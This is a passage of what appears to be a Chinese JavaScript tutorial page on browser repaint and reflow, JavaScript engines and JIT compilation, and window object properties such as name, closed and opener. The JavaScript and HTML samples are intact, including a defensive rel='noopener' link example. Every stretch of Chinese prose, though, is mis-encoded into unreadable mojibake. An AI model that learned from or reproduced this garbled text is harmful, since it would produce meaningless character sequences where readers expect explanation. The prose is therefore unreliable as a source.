‡æ‚¬åœï¼ˆ<code>a:hover</code>ï¼‰æ•ˆæœã€é¡µé¢æ»šåŠ¨ã€åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æ–‡æœ¬ã€æ”¹å˜çª—å£å¤§å°ç­‰ç­‰ã€‚</p> <p>é‡æµå’Œé‡ç»˜å¹¶ä¸ä¸€å®šä¸€èµ·å‘ç”Ÿï¼Œé‡æµå¿…ç„¶å¯¼è‡´é‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šéœ€è¦é‡æµã€‚æ¯”å¦‚æ”¹å˜å…ƒç´ é¢œè‰²ï¼Œåªä¼šå¯¼è‡´é‡ç»˜ï¼Œè€Œä¸ä¼šå¯¼è‡´é‡æµï¼›æ”¹å˜å…ƒç´ çš„å¸ƒå±€ï¼Œåˆ™ä¼šå¯¼è‡´é‡ç»˜å’Œé‡æµã€‚</p> <p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šæ™ºèƒ½åˆ¤æ–­ï¼Œå°†é‡æµå’Œé‡ç»˜åªé™åˆ¶åˆ°ç›¸å…³çš„å­æ ‘ä¸Šé¢ï¼Œæœ€å°åŒ–æ‰€è€—è´¹çš„ä»£ä»·ï¼Œè€Œä¸ä¼šå…¨å±€é‡æ–°ç”Ÿæˆç½‘é¡µã€‚</p> <p>ä½œä¸ºå¼€å‘è€…ï¼Œåº”è¯¥å°½é‡è®¾æ³•é™ä½é‡ç»˜çš„æ¬¡æ•°å’Œæˆæœ¬ã€‚æ¯”å¦‚ï¼Œå°½é‡ä¸è¦å˜åŠ¨é«˜å±‚çš„ DOM å…ƒç´ ï¼Œè€Œä»¥åº•å±‚ DOM å…ƒç´ çš„å˜åŠ¨ä»£æ›¿ï¼›å†æ¯”å¦‚ï¼Œé‡ç»˜<code>table</code>å¸ƒå±€å’Œ<code>flex</code>å¸ƒå±€ï¼Œå¼€é”€éƒ½ä¼šæ¯”è¾ƒå¤§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> foo <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

foo<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'blue'</span><span class="token punctuation">;</span>
foo<span class="token punctuation">.</span>style<span class="token punctuation">.</span>marginTop <span class="token operator">=</span> <span class="token string">'30px'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢çš„ä»£ç åªä¼šå¯¼è‡´ä¸€æ¬¡é‡ç»˜ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šç´¯ç§¯ DOM å˜åŠ¨ï¼Œç„¶åä¸€æ¬¡æ€§æ‰§è¡Œã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€äº›ä¼˜åŒ–æŠ€å·§ã€‚</p> <ul><li>è¯»å– DOM æˆ–è€…å†™å…¥ DOMï¼Œå°½é‡å†™åœ¨ä¸€èµ·ï¼Œä¸è¦æ··æ‚ã€‚ä¸è¦è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ï¼Œç„¶åç«‹åˆ»å†™å…¥ï¼Œæ¥ç€å†è¯»å–ä¸€ä¸ª DOM èŠ‚ç‚¹ã€‚</li> <li>ç¼“å­˜ DOM ä¿¡æ¯ã€‚</li> <li>ä¸è¦ä¸€é¡¹ä¸€é¡¹åœ°æ”¹å˜æ ·å¼ï¼Œè€Œæ˜¯ä½¿ç”¨ CSS class ä¸€æ¬¡æ€§æ”¹å˜æ ·å¼ã€‚</li> <li>ä½¿ç”¨<code>documentFragment</code>æ“ä½œ DOM</li> <li>åŠ¨ç”»ä½¿ç”¨<code>absolute</code>å®šä½æˆ–<code>fixed</code>å®šä½ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å¯¹å…¶ä»–å…ƒç´ çš„å½±å“ã€‚</li> <li>åªåœ¨å¿…è¦æ—¶æ‰æ˜¾ç¤ºéšè—å…ƒç´ ã€‚</li> <li>ä½¿ç”¨<code>window.requestAnimationFrame()</code>ï¼Œå› ä¸ºå®ƒå¯ä»¥æŠŠä»£ç æ¨è¿Ÿåˆ°ä¸‹ä¸€æ¬¡é‡æµæ—¶æ‰§è¡Œï¼Œè€Œä¸æ˜¯ç«‹å³è¦æ±‚é¡µé¢é‡æµã€‚</li> <li>ä½¿ç”¨è™šæ‹Ÿ DOMï¼ˆvirtual DOMï¼‰åº“ã€‚</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ª<code>window.requestAnimationFrame()</code>å¯¹æ¯”æ•ˆæœçš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// é‡ç»˜ä»£ä»·é«˜</span>
<span class="token keyword">function</span> <span class="token function">doubleHeight</span><span class="token punctuation">(</span><span class="token parameter">element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> currentHeight <span class="token operator">=</span> element<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>
  element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>currentHeight <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

all_my_elements<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>doubleHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// é‡ç»˜ä»£ä»·ä½</span>
<span class="token keyword">function</span> <span class="token function">doubleHeight</span><span class="token punctuation">(</span><span class="token parameter">element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> currentHeight <span class="token operator">=</span> element<span class="token punctuation">.</span>clientHeight<span class="token punctuation">;</span>

  window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token punctuation">(</span>currentHeight <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'px'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

all_my_elements<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>doubleHeight<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>ä¸Šé¢çš„ç¬¬ä¸€æ®µä»£ç ï¼Œæ¯è¯»ä¸€æ¬¡ DOMï¼Œå°±å†™å…¥æ–°çš„å€¼ï¼Œä¼šé€ æˆä¸åœçš„é‡æ’å’Œé‡æµã€‚ç¬¬äºŒæ®µä»£ç æŠŠæ‰€æœ‰çš„å†™æ“ä½œï¼Œéƒ½ç´¯ç§¯åœ¨ä¸€èµ·ï¼Œä»è€Œ DOM ä»£ç å˜åŠ¨çš„ä»£ä»·å°±æœ€å°åŒ–äº†ã€‚</p> <h3 id="javascript-å¼•æ“"><a href="#javascript-å¼•æ“" class="header-anchor">#</a> JavaScript å¼•æ“</h3> <p>JavaScript å¼•æ“çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œè¯»å–ç½‘é¡µä¸­çš„ JavaScript ä»£ç ï¼Œå¯¹å…¶å¤„ç†åè¿è¡Œã€‚</p> <p>JavaScript æ˜¯ä¸€ç§è§£é‡Šå‹è¯­è¨€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¸éœ€è¦ç¼–è¯‘ï¼Œç”±è§£é‡Šå™¨å®æ—¶è¿è¡Œã€‚è¿™æ ·çš„å¥½å¤„æ˜¯è¿è¡Œå’Œä¿®æ”¹éƒ½æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ·æ–°é¡µé¢å°±å¯ä»¥é‡æ–°è§£é‡Šï¼›ç¼ºç‚¹æ˜¯æ¯æ¬¡è¿è¡Œéƒ½è¦è°ƒç”¨è§£é‡Šå™¨ï¼Œç³»ç»Ÿå¼€é”€è¾ƒå¤§ï¼Œè¿è¡Œé€Ÿåº¦æ…¢äºç¼–è¯‘å‹è¯­è¨€ã€‚</p> <p>ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç›®å‰çš„æµè§ˆå™¨éƒ½å°† JavaScript è¿›è¡Œä¸€å®šç¨‹åº¦çš„ç¼–è¯‘ï¼Œç”Ÿæˆç±»ä¼¼å­—èŠ‚ç ï¼ˆbytecodeï¼‰çš„ä¸­é—´ä»£ç ï¼Œä»¥æé«˜è¿è¡Œé€Ÿåº¦ã€‚</p> <p>æ—©æœŸï¼Œæµè§ˆå™¨å†…éƒ¨å¯¹ JavaScript çš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p> <ol><li>è¯»å–ä»£ç ï¼Œè¿›è¡Œè¯æ³•åˆ†æï¼ˆLexical analysisï¼‰ï¼Œå°†ä»£ç åˆ†è§£æˆè¯å…ƒï¼ˆtokenï¼‰ã€‚</li> <li>å¯¹è¯å…ƒè¿›è¡Œè¯­æ³•åˆ†æï¼ˆparsingï¼‰ï¼Œå°†ä»£ç æ•´ç†æˆâ€œè¯­æ³•æ ‘â€ï¼ˆsyntax treeï¼‰ã€‚</li> <li>ä½¿ç”¨â€œç¿»è¯‘å™¨â€ï¼ˆtranslatorï¼‰ï¼Œå°†ä»£ç è½¬ä¸ºå­—èŠ‚ç ï¼ˆbytecodeï¼‰ã€‚</li> <li>ä½¿ç”¨â€œå­—èŠ‚ç è§£é‡Šå™¨â€ï¼ˆbytecode interpreterï¼‰ï¼Œå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ã€‚</li></ol> <p>é€è¡Œè§£é‡Šå°†å­—èŠ‚ç è½¬ä¸ºæœºå™¨ç ï¼Œæ˜¯å¾ˆä½æ•ˆçš„ã€‚ä¸ºäº†æé«˜è¿è¡Œé€Ÿåº¦ï¼Œç°ä»£æµè§ˆå™¨æ”¹ä¸ºé‡‡ç”¨â€œå³æ—¶ç¼–è¯‘â€ï¼ˆJust In Time compilerï¼Œç¼©å†™ JITï¼‰ï¼Œå³å­—èŠ‚ç åªåœ¨è¿è¡Œæ—¶ç¼–è¯‘ï¼Œç”¨åˆ°å“ªä¸€è¡Œå°±ç¼–è¯‘å“ªä¸€è¡Œï¼Œå¹¶ä¸”æŠŠç¼–è¯‘ç»“æœç¼“å­˜ï¼ˆinline cacheï¼‰ã€‚é€šå¸¸ï¼Œä¸€ä¸ªç¨‹åºè¢«ç»å¸¸ç”¨åˆ°çš„ï¼Œåªæ˜¯å…¶ä¸­ä¸€å°éƒ¨åˆ†ä»£ç ï¼Œæœ‰äº†ç¼“å­˜çš„ç¼–è¯‘ç»“æœï¼Œæ•´ä¸ªç¨‹åºçš„è¿è¡Œé€Ÿåº¦å°±ä¼šæ˜¾è‘—æå‡ã€‚</p> <p>å­—èŠ‚ç ä¸èƒ½ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼ˆVirtual Machineï¼‰ä¹‹ä¸Šï¼Œä¸€èˆ¬ä¹ŸæŠŠè™šæ‹Ÿæœºç§°ä¸º JavaScript å¼•æ“ã€‚å¹¶éæ‰€æœ‰çš„ JavaScript è™šæ‹Ÿæœºè¿è¡Œæ—¶éƒ½æœ‰å­—èŠ‚ç ï¼Œæœ‰çš„ JavaScript è™šæ‹ŸæœºåŸºäºæºç ï¼Œå³åªè¦æœ‰å¯èƒ½ï¼Œå°±é€šè¿‡ JITï¼ˆjust in timeï¼‰ç¼–è¯‘å™¨ç›´æ¥æŠŠæºç ç¼–è¯‘æˆæœºå™¨ç è¿è¡Œï¼Œçœç•¥å­—èŠ‚ç æ­¥éª¤ã€‚è¿™ä¸€ç‚¹ä¸å…¶ä»–é‡‡ç”¨è™šæ‹Ÿæœºï¼ˆæ¯”å¦‚ Javaï¼‰çš„è¯­è¨€ä¸å°½ç›¸åŒã€‚è¿™æ ·åšçš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†å°½å¯èƒ½åœ°ä¼˜åŒ–ä»£ç ã€æé«˜æ€§èƒ½ã€‚ä¸‹é¢æ˜¯ç›®å‰æœ€å¸¸è§çš„ä¸€äº› JavaScript è™šæ‹Ÿæœºï¼š</p> <ul><li><a href="https://en.wikipedia.org/wiki/Chakra_(JScript_engine)" target="_blank" rel="noopener noreferrer">Chakra<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> (Microsoft Internet Explorer)</li> <li><a href="http://en.wikipedia.org/wiki/WebKit#JavaScriptCore" target="_blank" rel="noopener noreferrer">Nitro/JavaScript Core<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> (Safari)</li> <li><a href="http://dev.opera.com/articles/view/labs-carakan/" target="_blank" rel="noopener noreferrer">Carakan<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> (Opera)</li> <li><a href="https://developer.mozilla.org/en-US/docs/SpiderMonkey" target="_blank" rel="noopener noreferrer">SpiderMonkey<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> (Firefox)</li> <li><a href="https://en.wikipedia.org/wiki/Chrome_V8" target="_blank" rel="noopener noreferrer">V8<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> (Chrome, Chromium)</li></ul> <h2 id="äºŒã€window-å¯¹è±¡"><a href="#äºŒã€window-å¯¹è±¡" class="header-anchor">#</a> äºŒã€window å¯¹è±¡</h2> <h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="header-anchor">#</a> æ¦‚è¿°</h2> <p>æµè§ˆå™¨é‡Œé¢ï¼Œ<code>window</code>å¯¹è±¡ï¼ˆæ³¨æ„ï¼Œ<code>w</code>ä¸ºå°å†™ï¼‰æŒ‡å½“å‰çš„æµè§ˆå™¨çª—å£ã€‚å®ƒä¹Ÿæ˜¯å½“å‰é¡µé¢çš„é¡¶å±‚å¯¹è±¡ï¼Œå³æœ€é«˜ä¸€å±‚çš„å¯¹è±¡ï¼Œæ‰€æœ‰å…¶ä»–å¯¹è±¡éƒ½æ˜¯å®ƒçš„ä¸‹å±ã€‚ä¸€ä¸ªå˜é‡å¦‚æœæœªå£°æ˜ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯é¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>a <span class="token comment">// 1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>a</code>æ˜¯ä¸€ä¸ªæ²¡æœ‰å£°æ˜å°±ç›´æ¥èµ‹å€¼çš„å˜é‡ï¼Œå®ƒè‡ªåŠ¨æˆä¸ºé¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p> <p><code>window</code>æœ‰è‡ªå·±çš„å®ä½“å«ä¹‰ï¼Œå…¶å®ä¸é€‚åˆå½“ä½œæœ€é«˜ä¸€å±‚çš„é¡¶å±‚å¯¹è±¡ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯­è¨€çš„è®¾è®¡å¤±è¯¯ã€‚æœ€æ—©ï¼Œè®¾è®¡è¿™é—¨è¯­è¨€çš„æ—¶å€™ï¼ŒåŸå§‹è®¾æƒ³æ˜¯è¯­è¨€å†…ç½®çš„å¯¹è±¡è¶Šå°‘è¶Šå¥½ï¼Œè¿™æ ·å¯ä»¥æé«˜æµè§ˆå™¨çš„æ€§èƒ½ã€‚å› æ­¤ï¼Œè¯­è¨€è®¾è®¡è€… Brendan Eich å°±æŠŠ<code>window</code>å¯¹è±¡å½“ä½œé¡¶å±‚å¯¹è±¡ï¼Œæ‰€æœ‰æœªå£°æ˜å°±èµ‹å€¼çš„å˜é‡éƒ½è‡ªåŠ¨å˜æˆ<code>window</code>å¯¹è±¡çš„å±æ€§ã€‚è¿™ç§è®¾è®¡ä½¿å¾—ç¼–è¯‘é˜¶æ®µæ— æ³•æ£€æµ‹å‡ºæœªå£°æ˜å˜é‡ï¼Œä½†åˆ°äº†ä»Šå¤©å·²ç»æ²¡æœ‰åŠæ³•çº æ­£äº†ã€‚</p> <h2 id="_1-window-å¯¹è±¡çš„å±æ€§"><a href="#_1-window-å¯¹è±¡çš„å±æ€§" class="header-anchor">#</a> 1.window å¯¹è±¡çš„å±æ€§</h2> <h3 id="window-name"><a href="#window-name" class="header-anchor">#</a> window.name</h3> <p><code>window.name</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå½“å‰æµè§ˆå™¨çª—å£çš„åå­—ã€‚çª—å£ä¸ä¸€å®šéœ€è¦åå­—ï¼Œè¿™ä¸ªå±æ€§ä¸»è¦é…åˆè¶…é“¾æ¥å’Œè¡¨å•çš„<code>target</code>å±æ€§ä½¿ç”¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Hello World!'</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token comment">// &quot;Hello World!&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>è¯¥å±æ€§åªèƒ½ä¿å­˜å­—ç¬¦ä¸²ï¼Œå¦‚æœå†™å…¥çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ã€‚å„ä¸ªæµè§ˆå™¨å¯¹è¿™ä¸ªå€¼çš„å‚¨å­˜å®¹é‡æœ‰æ‰€ä¸åŒï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥é«˜è¾¾å‡ MBã€‚</p> <p>åªè¦æµè§ˆå™¨çª—å£ä¸å…³é—­ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸ä¼šæ¶ˆå¤±çš„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œè®¿é—®<code>a.com</code>æ—¶ï¼Œè¯¥é¡µé¢çš„è„šæœ¬è®¾ç½®äº†<code>window.name</code>ï¼Œæ¥ä¸‹æ¥åœ¨åŒä¸€ä¸ªçª—å£é‡Œé¢è½½å…¥äº†<code>b.com</code>ï¼Œæ–°é¡µé¢çš„è„šæœ¬å¯ä»¥è¯»åˆ°ä¸Šä¸€ä¸ªç½‘é¡µè®¾ç½®çš„<code>window.name</code>ã€‚é¡µé¢åˆ·æ–°ä¹Ÿæ˜¯è¿™ç§æƒ…å†µã€‚ä¸€æ—¦æµè§ˆå™¨çª—å£å…³é—­åï¼Œè¯¥å±æ€§ä¿å­˜çš„å€¼å°±ä¼šæ¶ˆå¤±ï¼Œå› ä¸ºè¿™æ—¶çª—å£å·²ç»ä¸å­˜åœ¨äº†ã€‚</p> <h3 id="window-closedï¼Œwindow-opener"><a href="#window-closedï¼Œwindow-opener" class="header-anchor">#</a> window.closedï¼Œwindow.opener</h3> <p><code>window.closed</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºçª—å£æ˜¯å¦å…³é—­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>closed <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç æ£€æŸ¥å½“å‰çª—å£æ˜¯å¦å…³é—­ã€‚è¿™ç§æ£€æŸ¥æ„ä¹‰ä¸å¤§ï¼Œå› ä¸ºåªè¦èƒ½è¿è¡Œä»£ç ï¼Œå½“å‰çª—å£è‚¯å®šæ²¡æœ‰å…³é—­ã€‚è¿™ä¸ªå±æ€§ä¸€èˆ¬ç”¨æ¥æ£€æŸ¥ï¼Œä½¿ç”¨è„šæœ¬æ‰“å¼€çš„æ–°çª—å£æ˜¯å¦å…³é—­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>popup <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>popup<span class="token punctuation">.</span>closed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// çª—å£ä»ç„¶æ‰“å¼€ç€</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>window.opener</code>å±æ€§è¡¨ç¤ºæ‰“å¼€å½“å‰çª—å£çš„çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼ˆå³ç›´æ¥åœ¨åœ°å€æ è¾“å…¥æ‰“å¼€ï¼‰ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>opener <span class="token operator">===</span> window <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢è¡¨è¾¾å¼ä¼šæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶åè¿”å›<code>true</code>ã€‚</p> <p>å¦‚æœä¸¤ä¸ªçª—å£ä¹‹é—´ä¸éœ€è¦é€šä¿¡ï¼Œå»ºè®®å°†å­çª—å£çš„<code>opener</code>å±æ€§æ˜¾å¼è®¾ä¸º<code>null</code>ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ä¸€äº›å®‰å…¨éšæ‚£ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> newWin <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'example.html'</span><span class="token punctuation">,</span> <span class="token string">'newWindow'</span><span class="token punctuation">,</span> <span class="token string">'height=400,width=400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
newWin<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£çš„<code>opener</code>å±æ€§è®¾ä¸º<code>null</code>ï¼Œä¸¤ä¸ªçª—å£ä¹‹é—´å°±æ²¡åŠæ³•å†è”ç³»äº†ã€‚</p> <p>é€šè¿‡<code>opener</code>å±æ€§ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£çš„å…¨å±€å±æ€§å’Œæ–¹æ³•ï¼Œä½†åªé™äºä¸¤ä¸ªçª—å£åŒæºçš„æƒ…å†µï¼ˆå‚è§ã€ŠåŒæºé™åˆ¶ã€‹ä¸€ç« ï¼‰ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªçª—å£ç”±å¦ä¸€ä¸ªæ‰“å¼€ã€‚<code>&lt;a&gt;</code>å…ƒç´ æ·»åŠ <code>rel=&quot;noopener&quot;</code>å±æ€§ï¼Œå¯ä»¥é˜²æ­¢æ–°æ‰“å¼€çš„çª—å£è·å–çˆ¶çª—å£ï¼Œå‡è½»è¢«æ¶æ„ç½‘ç«™ä¿®æ”¹çˆ¶çª—å£ URL çš„é£é™©ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>https://an.evil.site<span class="token punctuation">&quot;</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>_blank<span class="token punctuation">&quot;</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>noopener<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
æ¶æ„ç½‘ç«™
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="window-selfï¼Œwindow-window"><a href="#window-selfï¼Œwindow-window" class="header-anchor">#</a> window.selfï¼Œwindow.window</h3> <p><code>window.self</code>å’Œ<code>window.window</code>å±æ€§éƒ½æŒ‡å‘çª—å£æœ¬èº«ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>self <span class="token operator">===</span> window <span class="token comment">// true</span>
window<span class="token punctuation">.</span>window <span class="token operator">===</span> window <span class="token comment">// true</span>
